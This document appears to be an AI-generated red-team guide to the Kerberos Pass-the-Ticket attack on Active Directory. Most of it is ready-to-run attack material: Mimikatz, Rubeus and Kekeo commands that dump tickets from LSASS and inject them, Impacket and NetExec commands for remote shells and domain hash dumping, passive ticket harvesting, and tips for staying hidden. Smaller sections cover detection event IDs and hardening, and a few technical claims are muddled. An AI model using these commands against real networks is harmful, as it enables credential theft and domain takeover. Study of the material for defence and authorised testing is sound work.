---
title: "Attack #5 — Pass-the-Ticket (PtT)"
description: "Pass-the-Ticket is a Kerberos credential theft and replay attack where an attacker extracts a valid Kerberos ticket — either a Ticket Granting Ticket…"
category: active-directory
subcategory: "Credential Access"
tags: ["active-directory", "kerberos", "ntlm", "hashing"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "BloodHound"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #5 — Pass-the-Ticket (PtT).md"
---
# 🔴 Attack #5 — Pass-the-Ticket (PtT)

***

## 📖 How It Works

Pass-the-Ticket is a **Kerberos credential theft and replay attack** where an attacker extracts a valid Kerberos ticket — either a Ticket Granting Ticket (TGT) or a Ticket Granting Service (TGS) ticket — directly from LSASS memory on a compromised host, then injects it into their own session to impersonate the victim. Unlike Pass-the-Hash which abuses NTLM, PtT operates entirely within the Kerberos protocol — meaning it works even in environments where NTLM has been disabled, and critically, **it can bypass MFA** because the ticket is already authenticated and cryptographically valid.

The key distinction is what you steal and how you use it. A stolen **TGT** is the golden prize — it acts as a master pass, allowing the attacker to request TGS service tickets for **any resource** the victim has access to, for the remaining lifetime of the ticket (typically 10 hours). A stolen **TGS** is more limited — it grants access only to the specific service it was issued for, but requires no further interaction with the DC.

> ⚠️ **Windows Server 2022+ / Credential Guard:** On systems with Credential Guard enabled, Kerberos tickets are isolated in the Virtual Secure Mode (VSM) and cannot be extracted from LSASS memory via traditional dumping tools like Mimikatz or Rubeus. The ticket injection attack still works if you have tickets from an older system, but extraction becomes impossible on hardened hosts. See "Hardening Commands" below for details.

### TGT vs TGS — What to Steal and When

| Property | TGT (Ticket Granting Ticket) | TGS (Service Ticket) |
|---|---|---|
| **Issued by** | KDC (AS-REP) | KDC (TGS-REP) |
| **Encrypted with** | KRBTGT hash | Target service account hash |
| **Grants access to** | **Any service in the domain** | Only the specific service it was issued for |
| **Lifetime** | 10 hours (renewable for 7 days) | Typically 10 hours |
| **Value** | Extremely high — full domain access | Moderate — single service access |
| **Where found** | LSASS memory of logged-in user | LSASS memory + Windows ticket cache |

### The Full Attack Flow

```
1. Gain foothold + local admin on any domain-joined Windows host
2. Dump Kerberos tickets from LSASS memory (Mimikatz / Rubeus)
3. Identify high-value TGTs (Domain Admins, service accounts, admin users)
4. Export ticket to .kirbi file OR base64 blob
5. Inject ticket into own session (kerberos::ptt / Rubeus ptt)
6. Authenticate to domain resources AS the victim — no password needed
7. MFA is bypassed — ticket is already authenticated
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin / SYSTEM on host** | Required to read LSASS memory where tickets are cached |
| **Active user sessions** | Victim user must be currently logged in (or recently logged in) — their TGT must be in memory |
| **Kerberos reachable** | Port 88 (Kerberos) must be accessible to inject and use the ticket |
| **Ticket validity window** | TGT must still be valid (10-hour default lifetime) — expired tickets are useless |
| **Linux users** | Tickets stored in ccache files (`/tmp/krb5cc_*`) — readable if you control the process/user |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Mimikatz** | Windows | `sekurlsa::tickets /export` + `kerberos::ptt` — the original PtT toolset |
| **Rubeus** | Windows | Superior modern tool — dump, triage, inject, monitor all in one |
| **Impacket** | Linux | `ticketer.py`, `getST.py`, `getTGT.py` — full Kerberos ticket toolkit |
| **CrackMapExec / NetExec** | Linux | `--use-kcache` flag to authenticate with ccache ticket |
| **Evil-WinRM** | Linux | Accepts KRB5CCNAME environment variable for ticket-based auth |
| **Kekeo** | Windows | Alternative to Mimikatz for ticket manipulation |
| **ticketConverter.py** | Linux | Converts `.kirbi` (Windows) ↔ `.ccache` (Linux) format — critical for cross-platform use |

***

## 💻 Full Commands

### 🔵 Step 0 — Enumerate Tickets in Memory (Reconnaissance)

```powershell
# Windows — built-in, list current session's tickets
klist

# Windows — list all tickets in all sessions (requires admin)
klist sessions

# Rubeus — list and triage all tickets across all sessions
.\Rubeus.exe triage

# Rubeus — list all tickets with full detail (times, encryption type, flags)
.\Rubeus.exe dump /nowrap

# Mimikatz — list all tickets
kerberos::list
kerberos::list /export
```

***

### 🔴 Mimikatz — Dump & Inject Tickets (Windows)

```powershell
# ── STEP 1: Dump all tickets from LSASS ──────────────────────────────────────

privilege::debug

# List all Kerberos tickets in memory
sekurlsa::tickets

# Export ALL tickets to .kirbi files in current directory
sekurlsa::tickets /export

# ── STEP 2: Inspect exported tickets ─────────────────────────────────────────
# Files will be named: [0;XXXXXX]-0-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
# The filename contains: [LUID]-[flags]-[enctype]-[username]@[service]-[domain]

# ── STEP 3: Inject a specific ticket into current session ────────────────────
kerberos::ptt [0;XXXXXX]-0-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi

# Inject multiple tickets at once (glob pattern)
kerberos::ptt *.kirbi

# ── STEP 4: Verify injection ─────────────────────────────────────────────────
kerberos::list

# ── STEP 5: Use the injected ticket ──────────────────────────────────────────
# From cmd.exe — access resources as the injected user
dir \\DC01\C$
dir \\fileserver01\shares$
psexec.exe \\DC01 cmd.exe
```

***

### 🔴 Rubeus — Full PtT Workflow (Windows — Recommended)

```powershell
# ── Dump tickets from all sessions (base64 + decoded) ────────────────────────
.\Rubeus.exe dump /nowrap

# Dump tickets for a specific LUID (logon session)
.\Rubeus.exe dump /luid:0x3e7 /nowrap

# Dump only TGT tickets (filter for krbtgt service)
.\Rubeus.exe dump /service:krbtgt /nowrap

# ── Export ticket to .kirbi file ──────────────────────────────────────────────
.\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap > ticket_b64.txt

# ── Inject ticket from base64 blob ────────────────────────────────────────────
.\Rubeus.exe ptt /ticket:<base64_encoded_ticket>

# Inject from .kirbi file
.\Rubeus.exe ptt /ticket:Administrator.kirbi

# ── Verify the ticket is injected ─────────────────────────────────────────────
.\Rubeus.exe triage
klist

# ── Monitor for new tickets being created (real-time harvest) ────────────────
.\Rubeus.exe monitor /interval:5 /nowrap

# Auto-harvest and inject new TGTs as they appear (e.g., admin logs in nearby)
.\Rubeus.exe harvest /interval:30

# ── Request a TGS using the injected TGT (access specific service) ────────────
.\Rubeus.exe asktgs /ticket:<base64_TGT> /service:cifs/DC01.corp.local /nowrap /ptt
.\Rubeus.exe asktgs /ticket:<base64_TGT> /service:host/DC01.corp.local /nowrap /ptt
```

***

### 🔴 Kekeo — Alternative Ticket Injection (Windows)

```powershell
# ── Dump and export tickets with Kekeo ─────────────────────────────────────
.\kekeo.exe
tkt::list

# Export specific ticket to .kirbi
tkt::export ::0 output.kirbi

# Inject ticket into current session
tkt::ptt ::output.kirbi
```

***

### 🔴 Linux — ccache Ticket Workflow (Impacket + NetExec)

```bash
# ── Convert .kirbi (Windows) → .ccache (Linux) ───────────────────────────────
ticketConverter.py Administrator.kirbi Administrator.ccache

# Convert .ccache → .kirbi (reverse direction)
ticketConverter.py Administrator.ccache Administrator.kirbi

# ── Set ticket for use by Impacket tools ─────────────────────────────────────
export KRB5CCNAME=/tmp/Administrator.ccache

# ── Use ticket with Impacket tools ───────────────────────────────────────────

# psexec with ticket (no password)
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# wmiexec with ticket
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# smbexec with ticket
smbexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# secretsdump with ticket (dump all domain hashes)
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local

# smbclient — browse shares
smbclient.py -k -no-pass corp.local/Administrator@DC01.corp.local

# ── NetExec with ticket ───────────────────────────────────────────────────────
export KRB5CCNAME=/tmp/Administrator.ccache
nxc smb DC01.corp.local --use-kcache
nxc smb DC01.corp.local --use-kcache -x whoami
nxc winrm DC01.corp.local --use-kcache

# ── Evil-WinRM with ticket ────────────────────────────────────────────────────
export KRB5CCNAME=/tmp/Administrator.ccache
evil-winrm -i DC01.corp.local -r corp.local
```

***

### 🔴 Impacket — Request TGT from Scratch (If You Have Creds/Hash)

```bash
# Request TGT using plaintext credentials (saves as .ccache)
getTGT.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10

# Request TGT using NT hash (Overpass-the-Hash style)
getTGT.py corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c -dc-ip 10.10.10.10

# Request TGT using AES key (stealthiest — no RC4 downgrade)
getTGT.py corp.local/Administrator -aesKey <AES256_KEY> -dc-ip 10.10.10.10

# Export the TGT and use it
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
```

***

### 🔴 Requesting Specific Service Tickets (TGS via PtT)

```bash
# Get a service ticket for CIFS (file shares) using a TGT
getST.py corp.local/Administrator -k -no-pass -spn cifs/DC01.corp.local -dc-ip 10.10.10.10

# Get a TGS for HOST service (PSExec, remote commands)
getST.py corp.local/Administrator -k -no-pass -spn host/DC01.corp.local -dc-ip 10.10.10.10

# Get a TGS for LDAP (BloodHound, DCSync)
getST.py corp.local/Administrator -k -no-pass -spn ldap/DC01.corp.local -dc-ip 10.10.10.10

# Impersonate another user via S4U2Self/S4U2Proxy (covered in Attack #16 — Constrained Delegation)
getST.py corp.local/svc_account -k -no-pass -spn cifs/DC01.corp.local -impersonate Administrator
```

***

### 🔴 Harvesting Tickets Passively (Real-Time Collection)

```powershell
# Rubeus — monitor for new TGTs every 5 seconds, output in base64
.\Rubeus.exe monitor /interval:5 /nowrap

# Rubeus — harvest TGTs and automatically inject them every 30 seconds
.\Rubeus.exe harvest /interval:30

# Ideal scenario: Run on a host where admins frequently log in
# Rubeus silently captures their TGTs as they authenticate
```

***

## 🎯 OPSEC Tips

- **Prefer TGT theft over TGS theft** — a TGT gives full access; a TGS only buys you one service
- **Use Rubeus `/nowrap`** at all times — corrupted base64 from line wrapping is the most common failure point
- **Use AES tickets over RC4** — if you can request AES TGTs, they draw far less attention than RC4 tickets in AES-enforced environments
- **Rubeus `monitor`** is your silent sentry — deploy it on a server where privileged users log in and let it harvest TGTs passively without any repeated LSASS access
- **Check ticket lifetime before injecting** — a 9-hour-old TGT with 1 hour left is useless for a long operation; `klist` shows the expiry time
- **Use FQDN not IP** when authenticating with Kerberos tickets — Kerberos doesn't work over raw IPs; always use `DC01.corp.local` not `10.10.10.10`
- **Convert kirbi ↔ ccache correctly** — the most common mistake when moving between Windows tooling and Linux Impacket is forgetting this conversion step

### OpSec Ranking by Stealth

| Method | Stealth | Speed | Notes |
|---|---|---|---|
| **Rubeus harvest + monitor** | ⭐⭐⭐⭐⭐ | Fast | Passive, no LSASS access on repeat — deploy and forget |
| **Rubeus dump + ptt (base64)** | ⭐⭐⭐⭐ | Fast | Single LSASS access, quick injection — 2-3 minutes total |
| **Mimikatz sekurlsa::tickets + ptt** | ⭐⭐⭐ | Medium | Older signature, still detectable, multiple Mimikatz invocations |
| **Extracting from Linux ccache** | ⭐⭐⭐⭐⭐ | Fast | Off-network ticket use — no DC communication needed |
| **Kekeo ticket dumping** | ⭐⭐⭐⭐ | Medium | Less common than Mimikatz/Rubeus, lower detection baseline |

### Time-to-Execute Estimates

- **Full PtT with Rubeus (dump → verify → inject → access resource):** 3 minutes
- **Passive harvest via Rubeus monitor (waiting for admin to log in):** 5–60 minutes (depends on target presence)
- **Linux ccache workflow (after tickets transferred):** 2 minutes
- **Kekeo ticket manipulation:** 2–4 minutes

### Tool Version Compatibility

- **Rubeus v1.6.4+:** Supports `/ptt` injection, `/dump`, `/monitor` reliably; no major breaking changes
- **Mimikatz 2.2.0+:** Standard sekurlsa commands stable; Kerberos operations work cross-Windows versions
- **Impacket (current):** ticketConverter, psexec, wmiexec all Kerberos-capable; requires Python 3.6+
- **NetExec latest:** `--use-kcache` stable; works with ccache format from all sources
- **Evil-WinRM v4.0+:** KRB5CCNAME support stable; requires Kerberos library installed on Linux

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4768** | Security Log | TGT requested — baseline normal, but flag if requestor IP doesn't match the account's usual workstation |
| **4769** | Security Log | TGS requested — watch for the **same TGT being used from two different IP addresses** simultaneously |
| **4770** | Security Log | TGT renewal — unusual renewal from an unexpected host |
| **4624** | Security Log | Logon Type 3 with Kerberos — compare source IP to known workstation of that user |
| **4648** | Security Log | Logon with explicit credentials — attacker using injected ticket to access remote resource |
| **Sysmon EID 10** | Sysmon | LSASS process access — ticket extraction precursor (same as PtH detection) |
| **Sysmon EID 1** | Sysmon | `Rubeus.exe` or `mimikatz.exe` process creation (signature-based) |

**Primary detection signature:** A TGT or TGS ticket being used from a **different IP address or machine** than the one that originally requested it. This is a near-definitive indicator of Pass-the-Ticket. Modern SIEMs can correlate the 4768 (ticket request origin) with subsequent 4769 (service ticket usage) and flag the discrepancy.

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `KRB_AP_ERR_SKEW` | System time skew between attacker and DC (>5 min) | Sync attacker system time with DC: `net time \\DC01 /set` or `timedatectl set-ntp true` |
| `KDC_ERR_ETYPE_NOSUPP` | Encryption type not supported (e.g., AES requested but only RC4 available) | Specify correct etype: RC4 = etype 23, AES256 = etype 18; check domain policy |
| `KRB5_CC_BADFORMAT` | Corrupted or malformed .ccache file | Regenerate ticket via getTGT.py; verify .kirbi→ccache conversion with `ticketConverter.py` |
| `KDC_ERR_PREAUTH_FAILED` | NT hash/AES key is incorrect or account is disabled | Verify hash from LSASS dump matches actual account; check account lockout in AD |
| `ERR_KRB5_KDC_UNREACH` | Cannot reach KDC on port 88 (firewall, routing, or bad DNS) | Test connectivity: `nc -zv DC01.corp.local 88`; verify DNS resolves DC FQDN to correct IP |
| `Ticket expired` | TGT/TGS lifetime exceeded | Check ticket validity with `klist`; extract fresh ticket from active user session |
| `LSASS dump returns zero tickets` | No Kerberos tickets in memory (user has no active session or Credential Guard enabled) | Ensure user is actively logged in; on Win2022+ with Credential Guard, extraction is not possible |
| `Base64 corruption from Rubeus /dump` | Line-wrapping in terminal output | Always use `/nowrap` flag to prevent line breaks: `.\Rubeus.exe dump /nowrap > output.txt` |

***

## 🗺️ MITRE ATT&CK

**Technique:** T1550.003 — Use Alternate Authentication Material: Pass the Ticket
**Tactic:** TA0008 — Lateral Movement

### Known APT Groups Using PtT

- **APT29 (Cozy Bear):** Leverages PtT for domain persistence and lateral movement post-compromise
- **FIN6 (Magecart operators):** Uses PtT to move laterally within compromised environments after initial foothold
- **Wizard Spider (Conti operators):** Employs PtT for rapid lateral movement during ransomware operations
- **HAFNIUM (State-sponsored, China-based):** Combines PtT with ProxyShell exploitation for Exchange compromise chains

**Detection baseline:** Organizations using Defender for Identity should flag "Suspicious Kerberos ticket usage" (multiple TGS requests from single source IP in short window) as a high-confidence PtT indicator.

***

## 🛡️ Advanced Detection & Hardening

### Sigma Rule References

- **Sigma Rule: PtT via Rubeus/Mimikatz** — Monitor for tool execution + 4768 requests within 60 seconds
- **Sigma Rule: Abnormal TGS usage** — Correlate 4769 events to 4768 origin; flag if source IP differs
- **Sigma Rule: LSASS dumping + Kerberos activity** — Sysmon EID 10 (LSASS access) followed by 4768 within 2 minutes

### EDR Detections (Defender for Identity)

- **"Unusual Kerberos ticket usage"** — When a ticket created on one host is used on a different host
- **"Sensitive group membership modification"** — If attacker uses PtT to escalate into DA/EA/BA groups
- **"Remote code execution via Kerberos ticket"** — Combination of ticket injection + lateral movement in same session

### Hardening Commands

```powershell
# ── Enable Credential Guard (Windows Server 2016+) ────────────────────────────
# Block LSASS memory access entirely — prevents ALL ticket extraction
dism /online /enable-feature /featurename:IsolatedUserMode

# ── Enforce Protected Users group (DC enforcement) ───────────────────────────
# Members cannot use NTLM or DES; forces AES/RC4 only
Add-ADGroupMember -Identity "Protected Users" -Members "CN=Administrator,CN=Users,DC=corp,DC=local"

# ── Set short TGT lifetime via GPO (reduce ticket reuse window) ───────────────
# Group Policy > Computer Configuration > Policies > Windows Settings > Security Settings
# > Kerberos Policy > Maximum lifetime for user ticket = 4 hours (default 10)
# Command to check current policy:
gpresult /h report.html
# Look for: "Maximum lifetime for user ticket"

# ── Enable AES-only enforcement (disable RC4 in Kerberos) ────────────────────
# On DC: Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" -Name "SupportedEncryptionTypes" -Value 28
# 28 = AES128 + AES256 only (RC4 disabled)

# ── Set account lockout + login attempt monitoring ────────────────────────────
# Via GPO: Account Policies > Account Lockout Policy
# Threshold: 3–5 failed attempts; Duration: 30 minutes
```

### Forensic Artifacts (What Survives Where)

| Artifact | Location | Survives Cleanup | Notes |
|---|---|---|---|
| **Kerberos .kirbi files** | `C:\Windows\Temp\` or current dir | Temporary — deleted if cleanup run | Recovered via DFIR tools if not overwritten |
| **Event Log 4768/4769** | Security Event Log | Yes (unless log cleared) | Primary detection source; correlate origin IP vs. usage IP |
| **LSASS memory dump** | Pagefile, hiberfil.sys, DRAM | If not cleared | Volatility/WinDbg analysis can recover dumped tickets post-reboot |
| **Rubeus/Mimikatz process execution** | Sysmon EID 1, MFT | Sysmon/Event logs persist | Signatures detect tool execution; MFT shows creation timestamp |
| **ccache file (Linux)** | `/tmp/krb5cc_*` or `.kerberos/cache` | No — cleanup removes | Immediate deletion after ticket use is OPSEC best practice |
| **Registry RunKeys** | HKLM\Software\Microsoft\Windows\Run | Yes | If attacker persists via scheduled task or RunKey, it persists |
| **User environment variables** | User registry hive | Yes | If KRB5CCNAME set in environment, survives session |

***

## 🔗 Attack Chain Context

```
[Pass-the-Ticket] ──→ Full Domain Access as Victim User (no password needed)
         │
         ├──→ 🩸 DCSync — inject DA's TGT → request LDAP TGS → DCSync all hashes
         ├──→ 🎫 Golden Ticket — if KRBTGT hash obtained, forge unlimited TGTs
         ├──→ 🎫 Silver Ticket — forge TGS without touching KDC (Attack #12)
         ├──→ 🔐 Overpass-the-Hash — convert NT hash into a TGT on the fly (Attack #6)
         ├──→ 📁 Access any file share, database, mailbox as the victim
         └──→ 🎯 Rubeus harvest → wait for DA to log in → instant privilege escalation
```

### Cross-References to Related Attacks

- **Attack #4 — Pass-the-Hash (PtH):** Uses NTLM directly; PtT is the Kerberos equivalent and often preferred
- **Attack #6 — Overpass-the-Hash (OPtH):** Converts NT hash to TGT; output is then used with PtT techniques
- **Attack #11 — Golden Ticket:** If you obtain KRBTGT hash via DCSync, forge unlimited TGTs instead of stealing individual ones
- **Attack #12 — Silver Ticket:** Similar to PtT but forges service-specific tickets without KDC interaction
- **Attack #16 — Constrained Delegation (S4U2Self/S4U2Proxy):** Uses TGTs to request tickets on behalf of other users

### PtH vs PtT — Know When to Use Which

| Scenario | Use PtH | Use PtT |
|---|---|---|
| NTLM enabled, Kerberos optional | ✅ | ✅ |
| NTLM disabled / Kerberos-only | ❌ | ✅ |
| MFA enabled on target account | ✅ (bypasses MFA) | ✅ (bypasses MFA) |
| Only have NT hash, no session | ✅ | ❌ (need existing ticket) |
| Victim currently logged in nearby | ✅ | ✅ (harvest their TGT) |
| Need to access specific Kerberos service | ❌ | ✅ |
| Cross-domain / forest access | ❌ | ✅ (inter-realm TGTs) |

***

> ✅ **Attack #5 — Pass-the-Ticket complete.** Tell me to move on when you're ready for **Attack #6 — Overpass-the-Hash (Pass-the-Key)**.

Sources
 Pass-the-Ticket (PtT) Attacks Explained: Detection, Impact & Mitigation https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/pass-the-ticket-attack/
 What is a Pass-the-Ticket Attack? Detection & Prevention - Cymulate https://cymulate.com/cybersecurity-glossary/pass-the-ticket-attack/
 Pass the Ticket Attack Explained - MITRE ATT&CK T1550.003 https://www.picussecurity.com/resource/blog/t1550.003-pass-the-ticket-adversary-use-of-alternate-authentication
 How to Defend Against a Pass the Ticket Attack: AD Security 101 https://www.semperis.com/blog/how-to-defend-against-pass-the-ticket-attack/
 Active Directory Attacks: Pass-the-Hash, Pass-the-Ticket & Qualys ... https://blog.qualys.com/product-tech/2026/02/11/qualys-etm-detect-pass-the-hash-pass-the-ticket-attacks
 Pass-the-Ticket Attacks | BeyondTrust https://www.beyondtrust.com/resources/glossary/what-are-pass-the-ticket-attacks
 Pass-the-Ticket (PtT) Attacks Explained: Detection, Impact ... https://netwrix.com/ko/cybersecurity-glossary/cyber-security-attacks/pass-the-ticket-attack/
 What are Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)? https://www.sentinelone.com/cybersecurity-101/threat-intelligence/what-are-pass-the-hash-pth-pass-the-ticket-ptt/
 Use Alternate Authentication Material: Pass the Ticket https://attack.mitre.org/techniques/T1550/003/
 What Is Pass the Ticket? How It Works & Examples - Twingate https://www.twingate.com/blog/glossary/pass%20the%20ticket
